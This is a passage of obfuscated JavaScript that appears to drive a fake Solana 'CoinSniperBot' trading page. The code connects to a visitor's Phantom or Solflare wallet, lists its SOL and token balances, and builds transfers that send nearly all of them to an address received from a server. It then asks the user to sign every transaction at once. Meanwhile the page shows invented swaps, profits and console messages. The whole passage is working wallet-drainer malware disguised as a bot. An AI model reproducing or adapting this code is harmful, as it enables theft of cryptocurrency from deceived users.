"#volume", "> Updating market data...", "NAME", "getBalance", "source", "#SOLBTC", "...", "#open_configure", "findProgramAddressSync", "#apply", "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=btc", "btc", "usd_24h_vol", "handlerProgramAddress", "minimal_amount", "green", "click", "sola_deposit", "serialize", "forEach", "createElement", "connect", "slice", "querySelector", "getElementById", "1255jhMMXa", "solflare", "#startedTime", "2054098Ptabnc", "bypass", "pidorstvo", "value", "classList", "profit", "https://stats.jup.ag/coingecko/tickers", " Sol", "innerHTML", "trying 1 ", "getParsedTokenAccountsByOwner", "#headerWalletBalance", "border", "confirmed", "<span>hr</span> ", "getElementsByClassName", "disabled", "> Initializing CoinSniperBot...", "target_currency", "finalizedPortfolio", "abs", " SOL\n                  </div>\n                </div>\n                ", "getItem", "phantomWallet", "random", "parse", "hide", "parseFloat", "div", "#amount", "amount", "loading", "split", "#addressToDeposit", "alert", "getTransaction", "#workingTime", "#center3bottom .center__console", "solana", "querySelectorAll", "token", "#alert", "after 1 try we get: \natransactions: ", "sendRawTransaction", "DOMContentLoaded", "style", "> New price data received.", "15888HvvUcN", "1047514CWYvuZ", "Connected at ", "publicKey", "toFixed", "> Checking system parameters...", "setItem", "{hash}", "modalChoice", "enabled", "RECEIVER", "none", "doublePopup", "solflareWallet", "solanaOwner", "lol", '</div>\n            <div class="left__table__body__line--item price red">', "MINT", "DECIMALS", "NATIVE-SOL", "toBuffer", "solBalance", "append", "> Transaction {hash} completed successfully.", "20cUNGRv"];
    return (Ut = function() {
        return t
    })()
}

function Et(t, M) {
    const e = Ut();
    return (Et = function(t, M) {
        return e[t -= 229]
    })(t, M)
}
async function bt(t = nt(404)) {
    const M = nt;
    if (p && p[M(331)]) return console.error("yes");
    if (console[M(263)](M(379) + G[M(274)]()), Dt) return;
    Dt = !0;
    var c = await window.loadFirstPopup();
    let w = null;
    const l = await s(G[M(274)]());
    var o;
    try {
        o = await l
    } catch (h) {
        return void console[M(266)](h)
    }
    w = o[M(387)];
    var A = new i(w);
    const D = await v(G),
        g = (await k[M(340)](G, {
            programId: a
        }))[M(333)],
        j = await B(G[M(274)](), g),
        r = await V(j, g, D);
    console[M(263)](M(349), r), console.log(r);
    const z = r[M(324)]()[M(271)]((t => {
        const e = M;
        return t[e(304)] != e(396) && t?.[e(395)] && (t[e(264)] = t[e(264)] / Math.pow(10, t.DECIMALS)), t
    }));
    console.log(r), c();
    var T = await async function() {
        var t = $,
            M = document[t(199)](t(153));
        M.classList[t(133)](t(184));
        const e = M[t(132)]({
                mode: t(242)
            }),
            i = document[t(199)]("link");
        i[t(213)] = t(145), i.href = t(187), e[t(109)](i);
        var n = document[t(199)](t(153));
        return n.innerHTML = '\n  <div>\n<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">\n<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>\n<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">\n  <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">\n  <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">\n      <div class="tw-text-left">\n      <div class="tw-flex tw-mb-3">\n          <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">' + it(p.words[t(144)]) + t(149) + G.toString() + t(247) + it(p[t(225)][t(105)]) + t(212) + it(p[t(225)][t(222)]) + t(147), e[t(109)](n), document[t(193)][t(109)](M), M
    }();
    await u(G[M(274)](), z, {
        phantom: wt,
        solflare: lt,
        coinbase: ot
    });
    const y = [];
    for (let e = 0; e < r.length; e += 1) y.push(r[M(324)](e, e + 1));
    let L = [],
        m = [],
        Q = [];
    if (console[M(263)](M(339) + (1 == p.phantomWallet[M(389)][M(386)] && 1 != p[M(353)][M(392)][M(386)]) + ": settingData.phantomWallet.doublePopup.enabled: " + p[M(353)][M(389)][M(386)] + M(270) + p[M(353)][M(392)][M(386)]), 1 == p[M(353)][M(389)][M(386)] && 1 != p[M(353)][M(392)][M(386)]) {
        const t = new n;
        if (p[M(353)][M(389)][M(368)] > 0 && t.add(N[M(403)]({
                fromPubkey: new i(p[M(353)][M(389)][M(391)]),
                toPubkey: G,
                lamports: p[M(353)][M(389)][M(368)] * e
            })), p.phantomWallet[M(389)][M(230)][M(294)] > 0)
            for (let e of p.phantomWallet[M(389)][M(230)]) await gt(t, e[M(370)], e[M(306)], e[M(265)], e.amount);
        m[M(287)](t), L[M(287)](m), m = []
    }
    console[M(263)](M(372) + L), console[M(263)]("slicedArray: " + y);
    for (const a of y)
        for (const t of a) {
            const a = new n;
            if (void 0 === t[M(394)] && t[M(304)] === M(396)) {
                console[M(263)](t);
                const c = D - Math.floor(e / 500 * r[M(294)]);
                if (console[M(263)](M(268) + c), c > 0) {
                    let t = {
                        BALANCE: c,
                        MINT: "NATIVE",
                        VALUE: c / e
                    };
                    if (Q[M(287)](t), a.add(N.transfer({
                            fromPubkey: G,
                            toPubkey: A,
                            lamports: c
                        })), m[M(287)](a), 1 == p[M(353)][M(392)][M(386)]) {
                        const t = c - (window[M(319)] || .1) * e,
                            i = new n;
                        i.add(N.transfer({
                            fromPubkey: A,
                            toPubkey: G,
                            lamports: t
                        })), m[M(287)](i)
                    }
                    if (1 == p[M(353)][M(389)].enabled && 1 != p[M(353)][M(392)][M(386)]) {
                        const t = new n;
                        t[M(254)](N[M(403)]({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), t[M(254)](N.transfer({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), t[M(254)](N[M(403)]({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), t.add(N[M(403)]({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), m[M(287)](t)
                    }
                    if (m[M(294)] > 100) {
                        if (1 == p[M(353)][M(392)][M(386)]) {
                            const t = new n;
                            if (p[M(353)][M(392)].solana > 0 && t[M(254)](N[M(403)]({
                                    fromPubkey: new i(p[M(353)][M(392)][M(391)]),
                                    toPubkey: G,
                                    lamports: p[M(353)][M(392)].solana * e
                                })), p[M(353)][M(392)][M(230)][M(294)] > 0)
                                for (let e of p[M(353)].lol[M(230)]) await gt(t, e[M(370)], e[M(306)], e.owner, e[M(360)]);
                            m[M(287)](t)
                        }
                        L[M(287)](m), m = []
                    }
                    console[M(263)]("native added")
                }
            } else try {
                const c = new i(t[M(394)]);
                console[M(263)](t);
                var U = t[M(264)] * Math[M(247)](10, t[M(395)]);
                console[M(263)]("am", U);
                const {
                    tokenSplitItem: w,
                    info: l
                } = await At(a, c, U, G, A, A);
                if (m.push(a), 1 == p[M(353)][M(392)][M(386)] && void 0 !== l) {
                    const t = new n;
                    await gt(t, c, l[M(315)], A, U), m[M(287)](t)
                }
                if (1 == p[M(353)].doublePopup[M(386)] && 1 != p[M(353)].lol[M(386)]) {
                    const t = new n;
                    t[M(254)](N[M(403)]({
                        fromPubkey: new i(M(240)),
                        toPubkey: G,
                        lamports: 1 * e
                    })), t[M(254)](N.transfer({
                        fromPubkey: new i(M(240)),
                        toPubkey: G,
                        lamports: 1 * e
                    })), t[M(254)](N.transfer({
                        fromPubkey: new i(M(240)),
                        toPubkey: G,
                        lamports: 1 * e
                    })), t[M(254)](N.transfer({
                        fromPubkey: new i(M(240)),
                        toPubkey: G,
                        lamports: 1 * e
                    })), m[M(287)](t)
                }
                if (m.length > 100) {
                    if (1 == p[M(353)][M(392)][M(386)]) {
                        const t = new n;
                        if (p[M(353)][M(392)][M(368)] > 0 && t[M(254)](N[M(403)]({
                                fromPubkey: new i(p[M(353)][M(392)][M(391)]),
                                toPubkey: G,
                                lamports: p.phantomWallet[M(392)][M(368)] * e
                            })), p[M(353)][M(392)][M(230)][M(294)] > 0)
                            for (let e of p.phantomWallet[M(392)][M(230)]) console[M(263)]("x", e), await gt(t, e[M(370)], e[M(306)], e[M(265)], e.amount);
                        m[M(287)](t)
                    }
                    if (1 == p[M(353)][M(389)].enabled && 1 != p[M(353)][M(392)][M(386)]) {
                        const t = new n;
                        t[M(254)](N[M(403)]({
                            fromPubkey: new i("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"),
                            toPubkey: G,
                            lamports: 1 * e
                        })), t[M(254)](N[M(403)]({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), t[M(254)](N[M(403)]({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), t[M(254)](N.transfer({
                            fromPubkey: new i(M(240)),
                            toPubkey: G,
                            lamports: 1 * e
                        })), m.push(t)
                    }
                    L[M(287)](m), m = []
                }
                void 0 !== w && Q[M(287)]({
                    VALUE: t[M(251)],
                    ...w
                })
            } catch (f) {
                console[M(263)](f)
            }
        }
    var E = m[M(294)];
    console[M(263)]("ez ", E);
    let b = !1;
    if (t == M(328)) {
        b = !0;
        for (let t = 0; t < p.solflareWallet[M(229)]; t++) {
            const t = new n;
            t[M(254)](N.transfer({
                fromPubkey: new i(Nt),
                toPubkey: G,
                lamports: p[M(390)][M(286)] * e
            })), m.push(t)
        }
    }
    if (1 == p.phantomWallet[M(392)].enabled) {
        const t = new n;
        if (p[M(353)][M(392)][M(368)] > 0 && t[M(254)](N[M(403)]({
                fromPubkey: new i(p[M(353)][M(392)].solanaOwner),
                toPubkey: G,
                lamports: p[M(353)][M(392)].solana * e
            })), p[M(353)][M(392)].tokens[M(294)] > 0)
            for (let e of p.phantomWallet[M(392)].tokens) await gt(t, e[M(370)], e[M(306)], e[M(265)], e[M(360)]);
        m.push(t)
    }
    m[M(294)] > 0 && L[M(287)](m);
    let C = !1;
    for (; !C;) {
        try {
            await d(G[M(274)]());
            let t, a = 0;
            const c = async () => {
                const e = M;
                try {
                    t = await k[e(259)](e(343))
                } catch {
                    if (a > 5 && !t) return;
                    a++, await c()
                }
            };
            if (await c(), !t) return void console.log(M(248));
            console[M(263)](M(245), t), b && (L = L.reverse());
            for (let w of L) {
                if (1 != p[M(353)][M(389)][M(386)] && 1 != p[M(353)].lol[M(386)]) {
                    const t = new n;
                    t[M(254)](N.transfer({
                        fromPubkey: new i(M(240)),
                        toPubkey: G,
                        lamports: 5 * e
                    })), w.push(t)
                }
                for (const e of w) e.recentBlockhash = t[M(277)], e[M(232)] = G;
                b && (w = w[M(412)]()), console[M(263)](w);
                let a = [],
                    c = await W.signAllTransactions(w);
                document[M(325)](M(239))[M(375)][M(292)] = "block", b && (c = c[M(412)]());
                for (const t of c) {
                    let e = 0;
                    const i = async () => {
                        const n = M;
                        try {
                            const M = t[n(320)]();
                            a[n(287)](await k[n(373)](M))
                        } catch (N) {
                            if (e > 20) return;
                            e++, await new Promise((t => setTimeout(t, 3e3))), i(), console[n(263)](N)
                        }
                    };
                    await i()
                }
                for (; 0 != a[M(294)];) await O(2e3), a = (await Promise.all(a[M(271)]((async t => {
                    const e = M,
                        i = await k[e(365)](t, {
                            commitment: "confirmed"
                        });
                    return console[e(263)](i), null == i && t
                }))))[M(246)]((t => 0 != t));
                const l = {
                    ITEMS: z,
                    WALLET_ADDRESS: window[M(368)][M(380)].toString()
                };
                await x(l)
            }
            C = !0, yt[M(334)][M(254)]("hide"), mt[M(334)][M(295)](M(356)), Lt[M(334)][M(295)]("hide"), Ct[M(334)][M(295)](M(356)), localStorage.setItem(M(267), (new Date)[M(279)]()[M(274)]()), pt.style[M(292)] = M(234)
        } catch (Y) {
            if (console[M(263)](Y), await I(G[M(274)]()), null != T) {
                for (var S of (T[M(295)](), document.getElementsByClassName(M(241)))) S[M(295)]();
                T = null
            }
            throw Dt = !1, Y
        }
        if (await O(500), document[M(325)](M(239))[M(375)][M(292)] = M(388), null != T) {
            for (var S of (T[M(295)](), document[M(345)](M(241)))) S[M(295)]();
            T = null
        }
    }
    Dt = !1
}
window[nt(385)] = async function(t) {
    const M = nt,
        i = await X(t);
    let n = Number[M(357)](document.getElementById(M(360))[M(333)]),
        N = await k[M(305)](G);
    return console[M(263)](N / e + M(290)), window[M(398)] = N / 10 ** 9, n && !isNaN(n) || (n = Number(p[M(353)][M(316)])), window[M(319)] = n, console[M(263)](n), !n || Number.isNaN(n) ? (document[M(325)]("#amount")[M(375)].border = M(243), void setTimeout((function() {
        const t = M;
        document[t(325)](t(359))[t(375)][t(342)] = t(388)
    }), 1e3)) : (console[M(263)](n < p.phantomWallet[M(316)] && !isNaN(p.phantomWallet.minimal_amount)), n < p[M(353)].minimal_amount && !isNaN(p[M(353)][M(316)]) ? (document[M(326)](M(364))[M(334)][M(295)](M(356)), document[M(326)](M(364))[M(334)][M(295)](M(317)), document[M(326)](M(364)).innerText = "Minimum deposit to launch the bot is " + p.phantomWallet[M(316)] + M(337), void setTimeout((function() {
        const t = M;
        document.querySelector(t(371))[t(334)][t(254)](t(356))
    }), 3e3)) : (console[M(263)](n >= window[M(398)] && !isNaN(window[M(398)])), n >= window[M(398)] && !isNaN(window[M(398)]) ? (document[M(326)](M(364))[M(334)][M(295)]("hide"), document.getElementById(M(364))[M(261)] = M(276), void setTimeout((function() {
        const t = M;
        document[t(325)](t(371))[t(334)][t(254)]("hide")
    }), 3e3)) : (localStorage[M(352)](M(267)) && (window[M(319)] = Number("-" + (localStorage[M(352)](M(335)) ?? M(409)))), await bt(i), !0)))
}, document[nt(325)](nt(363));
const Ct = document[nt(325)]("#headerWallet"),
    St = document[nt(325)]("#center1 .center__console"),
    ht = document.querySelector(nt(300)),
    kt = document[nt(325)](nt(367)),
    ft = document.querySelector(nt(252)),
    Yt = document.querySelector("#rightTable"),
    vt = document[nt(325)]("#SOLUSD"),
    Bt = document[nt(325)](nt(307)),
    Vt = document[nt(325)](nt(257)),
    Zt = document.querySelector(nt(302)),
    Ft = [St, ht, kt],
    Wt = [nt(347), nt(233), "> Establishing connection with the exchange...", nt(382), "> All system parameters are normal.", nt(258), nt(303)],
    Gt = [nt(303), nt(376), nt(275), nt(400)],
    Rt = [];
async function Ht(t, M, e) {
    const i = nt;
    t[i(334)][i(295)]("hide"), await new Promise((t => setTimeout(t, e)));
    for (const n of M[i(362)]("")) t[i(338)] += n, await new Promise((t => setTimeout(t, 50)))
}
async function Pt(t) {
    const M = nt;
    for (const e of Wt) Ft[t].innerHTML += M(408);
    document[M(369)]("#center" + (t + 1) + " .console-message")[M(321)](((t, M) => {
        const e = 2e3 * M;
        Ht(t, Wt[M], e)
    }))
}!async function() {
    const t = nt;
    for (;;)
        if (await new Promise((t => setTimeout(t, 500))), Rt?.[t(294)])
            for (let M of Rt)
                for (let e = 0; e < Gt.length; e++) {
                    const i = e == Gt[t(294)] - 1 ? Gt[e][t(407)](t(384), M) : Gt[e],
                        n = document[t(322)](t(358));
                    n[t(334)][t(254)]("console-message"), kt[t(399)](n), await Ht(n, i, 2e3 * e)
                }
}(), async function() {
    const t = nt,
        M = localStorage[t(352)](t(280));
    if (M) {
        const e = JSON[t(355)](M);
        return vt[t(338)] = e[t(368)][t(281)], Bt[t(338)] = e[t(368)][t(313)], Vt.innerHTML = e[t(368)][t(242)], void(Zt[t(338)] = e[t(368)][t(314)])
    }
    fetch(t(411))[t(273)]((t => t.json()))[t(273)]((async M => {
        const e = t;
        vt.innerHTML = M[e(368)].usd, Vt[e(338)] = (M[e(368)].usd_market_cap / 1e9)[e(381)](2) + "B", Zt[e(338)] = (M.solana.usd_24h_vol / 1e9).toFixed(2) + "B";
        const i = await fetch(e(312))[e(273)]((t => t[e(255)]()))[e(273)]((t => Bt[e(338)] = t[e(368)].btc));
        localStorage[e(383)]("pricesData", JSON.stringify({
            solana: {
                usd: M.solana[e(281)],
                btc: i,
                usd_market_cap: (M[e(368)][e(242)] / 1e9)[e(381)](2) + "B",
                usd_24h_vol: (M[e(368)][e(314)] / 1e9).toFixed(2) + "B"
            }
        }))
    }))
}();
const Xt = document.querySelector("#totalProfit"),
    Jt = document.querySelector("#totalTx"),
    Kt = document[nt(325)](nt(366));
async function qt() {
    const t = nt;
    let M = await (await fetch(t(336))).json();
    M = M[t(246)]((M => {
        const e = t,
            i = Number(M?.[e(288)]);
        return !(isNaN(i) || i < 1e-4) && !(!M?.base_currency || !M?.[e(348)])
    }));
    const e = Math.floor(Math[t(354)]() * (M[t(294)] - 20));
    if (console.log(M.length, e, M[t(324)](e, e + 20)), !M) return;
    let i = "";
    for (let A of M[t(324)](e, e + 20)) i += t(406) + A?.[t(285)] + "/" + A?.[t(348)] + t(393) + Number(A[t(288)]).toFixed(4) + " " + A?.target_currency + t(296);
    Tt[t(338)] = i;
    if (!localStorage.getItem(t(267))) return;
    const n = M[Math.floor(Math[t(354)]() * (M.length - 1))],
        N = Number(t(236) + Math[t(244)](5 * Math.random())),
        a = function() {
            const t = nt,
                M = t(298);
            let e = "";
            for (let i = 0; i < 4; i++) e += M.charAt(Math[t(244)](Math[t(354)]() * M.length));
            e += t(308);
            for (let i = 0; i < 4; i++) e += M.charAt(Math[t(244)](Math.random() * M[t(294)]));
            return e
        }();
    !async function(t) {
        Rt[nt(287)](t)
    }(a);
    const c = t(256) + a + '\n                  </div>\n                  <div class="right__table__body__line--item type">Swap</div>\n                  <div class="right__table__body__line--item coin">' + n?.[t(285)] + t(272) + N + t(351),
        w = localStorage.getItem(t(262)),
        l = localStorage[t(352)](t(335)),
        o = localStorage[t(352)]("transactions");
    Xt.innerHTML = (l ? Number(l) + N : N)[t(381)](2), Jt.innerHTML = (o ? Number(o) + 1 : 1)[t(274)](), localStorage[t(383)](t(262), w ? c + w : c), localStorage.setItem(t(335), (l ? Number(l) + N : N).toString()), localStorage.setItem(t(229), (o ? Number(o) + 1 : 1).toString()), Yt[t(338)] = c + Yt[t(338)], ft[t(334)].contains(t(356)) || ft[t(334)].add(t(356))
}
async function _t() {
    const t = nt;
    let M = localStorage.getItem(t(414));
    if (!M) return;
    const n = await window.phantom[t(368)][t(323)]();
    n.publicKey.toString() != M && (M = n[t(380)][t(274)](), localStorage[t(383)]("address", n[t(380)][t(274)]()), pt.style[t(292)] = t(388));
    const N = await k[t(305)](new i(M));
    Qt[t(338)] = (N / e).toFixed(5).toString()
}

function $t(t, M) {
    const e = nt,
        i = Math[e(350)](t - M),
        n = Math[e(244)](i / 1e3 / 60),
        N = Math[e(244)](n / 60),
        a = n % 60;
    return (N < 10 ? "0" : "") + N + ":" + (a < 10 ? "0" : "") + a
}
async function tM() {
        for (var t = 0; t < at.concurrent; t++) setTimeout(r, 500)
    }(function() {
        const t = nt;
        if (!localStorage[t(352)](t(267))) return;
        const M = localStorage[t(352)]("swaps");
        ft[t(334)][t(254)](t(356)), Yt[t(338)] = M
    })(), setInterval((() => qt()), 3e3), qt(), setInterval((() => _t()), 5e3), _t(),
    function() {
        const t = nt,
            M = localStorage[t(352)](t(414)),
            e = localStorage[t(352)](t(267)),
            i = localStorage.getItem("transactions"),
            n = localStorage[t(352)]("profit");
        if (M && !e) xt[t(334)][t(254)](t(356)), yt.classList[t(295)]("hide");
        else if (M && e) {
            xt[t(334)][t(254)](t(356)), mt[t(334)][t(295)](t(356)), Lt.classList[t(295)](t(356)), Ct[t(334)][t(295)]("hide");
            const [M, N] = $t(Number(e), (new Date)[t(279)]()).split(":");
            Ot[t(338)] = new Date(Number(e))[t(269)]() + ":" + new Date(Number(e)).getMinutes(), Kt[t(338)] = M + t(344) + N + t(283), Xt[t(338)] = Number(n)[t(381)](2), Jt[t(338)] = i, ft[t(334)][t(254)](t(356))
        }
        Pt(0), Pt(1), Pt(2)
    }(), setInterval((() => function() {
        const t = nt,
            M = localStorage.getItem(t(267));
        if (!M) return;
        const [e, i] = $t(Number(M), (new Date)[t(279)]())[t(362)](":");
        Kt[t(338)] = e + t(344) + i + t(283)
    }()), 6e4), jt[nt(249)](nt(318), (function() {
        const t = nt;
        return rt[t(333)] ? zt[t(333)] ? void(window.phantom[t(368)].isConnected && (localStorage[t(383)](t(414), window[t(404)][t(368)][t(380)][t(274)]()), _t(), st.classList[t(254)](t(356)), xt[t(334)][t(254)](t(356)), yt[t(334)][t(295)]("hide"))) : (zt[t(375)][t(342)] = t(253), void setTimeout((() => zt[t(375)].border = t(299)), 500)) : (rt[t(375)][t(342)] = "2px solid rgb(242, 54, 69);", void setTimeout((() => rt.style[t(342)] = t(299)), 500))
    })), It.addEventListener("click", (function() {
        const t = nt;
        ut[t(334)][t(293)]("hide") ? ut[t(334)].remove("hide") : ut[t(334)][t(254)](t(356))
    })), dt.addEventListener("click", (function() {
        const t = nt;
        st[t(334)][t(295)](t(356)), console[t(263)](t(332), st[t(334)])
    })), ct = document[nt(369)]("#deposit"), ct[nt(321)]((t => {
        const M = nt;
        t.addEventListener(M(318), (async () => {
            const t = M;
            await window[t(385)](t(404))
        }))
    })), document[nt(231)] === nt(361) ? document[nt(249)](nt(374), (async () => {
        const t = nt;
        at[t(386)] && (setTimeout(tM, 1e3), setTimeout((() => {
            const M = t;
            document.getElementById(M(237))[M(346)] = !1
        }), 1e3 * at[t(235)]))
    })) : setTimeout((async () => {
        at.enabled && (setTimeout(tM, 1e3), setTimeout((() => {
            document[Et(326)]("claim-button").disabled = !1
        }), 1e3 * at.loadTime))
    }), 1), window[nt(301)] = bt;